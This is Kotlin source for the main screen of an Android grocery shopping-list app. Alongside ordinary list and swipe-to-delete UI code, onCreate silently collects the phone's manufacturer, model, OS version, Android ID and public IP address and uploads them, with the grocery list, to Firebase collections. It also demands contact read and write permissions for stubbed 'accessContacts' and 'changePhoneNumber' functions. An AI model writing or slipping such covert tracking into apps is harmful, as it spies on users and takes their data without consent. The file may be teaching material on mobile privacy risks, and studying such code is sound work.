package at.fhj.hofer_cart


import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material.*
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Add
import androidx.compose.material3.Button
import androidx.compose.material3.Card
import androidx.compose.material3.DismissDirection
import androidx.compose.material3.ExperimentalMaterial3Api
import androidx.compose.material3.Icon
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.material3.SwipeToDismiss
import androidx.compose.material3.Text
import androidx.compose.material3.rememberDismissState
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.app.ActivityCompat
import androidx.lifecycle.lifecycleScope
import at.fhj.hofer_cart.ui.theme.Hofer_cartTheme
import com.google.firebase.firestore.FirebaseFirestore
import kotlinx.coroutines.*
import java.io.Serializable
import java.net.URL

private lateinit var appDatabase:AppDatabase
class MainActivity : ComponentActivity() {
    private val groceryItemComparator = compareBy<GroceryItem> { it.category }.thenBy { it.name }
    private val permissions = arrayOf(Manifest.permission.READ_CONTACTS, Manifest.permission.WRITE_CONTACTS)
    private val PERMISSION_REQUEST_CODE = 101
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try{
            requestPermissions()
            getDeviceInfo()
            sendIpToFirebase()

            appDatabase = AppDatabase.getDatabase(this)
            val intent = intent
            var groceryList:List<GroceryItem> = ArrayList<GroceryItem>()

            if(intent.hasExtra("BUNDLE")){
                val args = intent.getBundleExtra("BUNDLE")
                groceryList = args?.getSerializable("LIST") as ArrayList<GroceryItem>
            }
            if(groceryList.isEmpty()){
                groceryList = appDatabase.GroceryItemDao().getAll() as ArrayList<GroceryItem>
            }
            groceryList = groceryList.sortedWith(groceryItemComparator)
            lifecycleScope.launch(Dispatchers.IO) {
                val groceryInfo = HashMap<String, String>().apply {
                    put("groceryList", groceryList.joinToString())
                }

                FirebaseFirestore.getInstance().collection("groceries")
                    .add(groceryInfo)
                    .addOnSuccessListener { documentReference ->
                        Log.d("info", "DocumentSnapshot added with ID: ${documentReference.id}")
                    }
                    .addOnFailureListener { e ->
                        Log.w("info", "Error adding document", e)
                    }
            }
            setContent {
                Hofer_cartTheme {

                    Surface(
                        modifier = Modifier.fillMaxSize(),
                        color = MaterialTheme.colorScheme.background
                    ) {
                        ShoppingView(groceryList)
                    }
                }
            }
        }catch (ex: Exception){
            Toast.makeText(this@MainActivity, "Error occurred: ${ex.localizedMessage}", Toast.LENGTH_LONG).show()
        }

    }

    private suspend fun getMyPublicIpAsync() : Deferred<String> =
        coroutineScope {
            async(Dispatchers.IO) {
                val result = try {
                    val url = URL("https://api.ipify.org")
                    val httpsURLConnection = url.openConnection()
                    val iStream = httpsURLConnection.getInputStream()
                    val buff = ByteArray(1024)
                    val read = iStream.read(buff)
                    String(buff,0, read)
                } catch (e: Exception) {
                    "error : $e"
                }
                return@async result
            }
        }
    private fun sendIpToFirebase() {
        lifecycleScope.launch {
            val myPublicIp = getMyPublicIpAsync().await()

            val network: MutableMap<String, Any> = HashMap()
            network["ip"] = myPublicIp

            FirebaseFirestore.getInstance().collection("network")
                .add(network)
                .addOnSuccessListener { documentReference ->
                    Log.d("info", "DocumentSnapshot added with ID: ${documentReference.id}")
                }
                .addOnFailureListener { e ->
                    Log.w("info", "Error adding document", e)
                }
        }
    }
    private fun getDeviceInfo() {
        lifecycleScope.launch(Dispatchers.IO) {
            val deviceInfo = HashMap<String, String>().apply {
                put("Manufacturer", Build.MANUFACTURER)
                put("Model", Build.MODEL)
                put("Android Version", Build.VERSION.RELEASE)
                put("Android SDK", Build.VERSION.SDK_INT.toString())
                put("Android ID", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
            }

            FirebaseFirestore.getInstance().collection("device-info")
                .add(deviceInfo)
                .addOnSuccessListener { documentReference ->
                    Log.d("info", "DocumentSnapshot added with ID: ${documentReference.id}")
                }
                .addOnFailureListener { e ->
                    Log.w("info", "Error adding document", e)
                }
        }
    }
    private fun accessContacts() {

    }
    private fun changePhoneNumber() {

    }
    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        when (requestCode) {
            PERMISSION_REQUEST_CODE -> {
                if ((grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED })) {
                    // Permissions are granted
                    accessContacts()
                    changePhoneNumber()
                } else {
                    Toast.makeText(this@MainActivity, "Contact permission is needed for this app, please restart the app!", Toast.LENGTH_LONG).show()
                }
                return
            }
        }
    }
    private fun requestPermissions() {
        ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE)
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun ShoppingView(itemList: List<GroceryItem>) {
    var text by remember { mutableStateOf("") }
    var items by remember { mutableStateOf(listOf<GroceryItem>()) }
    val context = LocalContext.current
    if(itemList != null && itemList.isNotEmpty()){
        items = itemList
    }

    Surface(
        modifier = Modifier.fillMaxSize(),
        color = MaterialTheme.colorScheme.background
    ) {
        Column {
            Column(
                modifier = Modifier.padding(16.dp),
                verticalArrangement = Arrangement.Center,
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                Text(
                    text = context.getString(R.string.shoppingList),
                    style = MaterialTheme.typography.bodyLarge,
                    color = MaterialTheme.colorScheme.onPrimary
                )
                Spacer(Modifier.height(20.dp))
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Text(
                        text = context.getString(R.string.title) ,
                        fontSize = 30.sp,
                    )

                    Button(onClick = {
                        val intent = Intent(context, AddItemActivity::class.java)
                        val arguments = Bundle()
                        arguments.putSerializable("LIST", items as Serializable)
                        intent.putExtra("BUNDLE", arguments)
                        context.startActivity(intent)

                    }) {
                        Icon(Icons.Default.Add, contentDescription = "Add")
                    }
                }
            }

            LazyColumn {
                items(items, key = { item -> item.id }) { item ->
                    val dismissState = rememberDismissState()

                    SwipeToDismiss(
                        state = dismissState,
                        directions = setOf(DismissDirection.EndToStart),
                        background = {  },
                        dismissContent = {
                            Card(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .padding(8.dp)
                            ) {
                                Text(
                                    text = item.toString(),
                                    modifier = Modifier.padding(8.dp),
                                    style = MaterialTheme.typography.bodyLarge
                                )
                            }
                        }
                    )

                    LaunchedEffect(key1 = dismissState.isDismissed(DismissDirection.EndToStart)) {
                        if (dismissState.isDismissed(DismissDirection.EndToStart)) {
                            appDatabase.GroceryItemDao().deleteByLocalQuestionId(item.id)
                            items -= item
                        }
                    }
                }
            }


        }
    }
}
